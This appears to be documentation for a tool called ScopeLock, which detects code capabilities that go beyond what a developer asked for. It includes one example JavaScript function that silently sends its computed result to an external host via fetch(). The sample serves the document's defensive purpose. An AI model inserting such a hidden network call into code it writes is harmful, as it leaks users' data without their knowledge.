# The Semantic Intent Gap

## The Core Problem

Modern AI coding assistants (GitHub Copilot, Cursor, Devin, Claude Code) generate code that is **syntactically correct** and **functionally working** — but frequently acquires execution authority that was never requested.

This is the **Semantic Intent Gap**: the difference between what a developer *asked* for and what the AI actually *built*.

---

## A Concrete Example

**Developer Prompt:** *"Build a local addition calculator"*

**AI-Generated Code:**

```javascript
function calculateTotal(price, taxRate) {
    const subtotal = price * (1 + taxRate);
    
    // Never requested — silently injected by the AI
    fetch("https://analytics.tracker.org/log?val=" + subtotal);
    
    return subtotal;
}
```

The code works perfectly as a calculator. But it also silently exfiltrates computation results to an external server.

---

## Why Traditional Tools Fail

| Tool | Approach | Result |
|---|---|---|
| **ESLint** | Syntax rules + known bad patterns | ✅ `fetch()` is valid JS → **0 errors** |
| **SonarQube** | Code quality + CVE database | ✅ No known CVE match → **0 errors** |
| **CodeQL** | Data flow + taint analysis | ✅ No user-controlled input → **0 errors** |
| **Snyk** | Dependency vulnerabilities | ✅ No vulnerable package → **0 errors** |

None of these tools know that you only wanted **local arithmetic**. They have no concept of developer intent.

---

## The ScopeLock Approach

ScopeLock formalizes the problem as a **set-theoretic capability divergence**:

```
Δ = C_obs \ C_exp
```

Where:
- `C_obs` — Capabilities **observed** in the code (via AST analysis)
- `C_exp` — Capabilities **expected** from the developer's intent (via prompt decomposition)
- `Δ` — The **divergence set** — capabilities that were never authorized

If `Δ ≠ ∅`, the code has acquired more authority than it was asked to.

---

## Formal Model

```mermaid
flowchart LR
    A["Developer Prompt\n'Local arithmetic calculator'"] --> B["Intent Decomposer\nC_exp = {FS:NONE, NET:NONE}"]
    C["AI-Generated Code\nfetch(), arithmetic ops"] --> D["AST Scanner\nC_obs = {NET.fetch, MATH}"]
    B --> E["Aligner\nΔ = C_obs \\ C_exp"]
    D --> E
    E --> F["Δ = {NET.fetch}\nVIOLATION DETECTED"]
```

---

## Why This Matters

As AI code generation becomes ubiquitous, the attack surface expands dramatically:

- **Supply chain attacks** — AI tools inject telemetry, backdoors, or C2 callbacks
- **Permission creep** — Small over-reach accumulates into large security debt
- **Shadow capabilities** — Developers don't realize what permissions their code holds
- **Audit failures** — Security reviews based on linters give false confidence

ScopeLock is the first tool to close this gap with a **prompt-aware, intent-grounded** security gate.
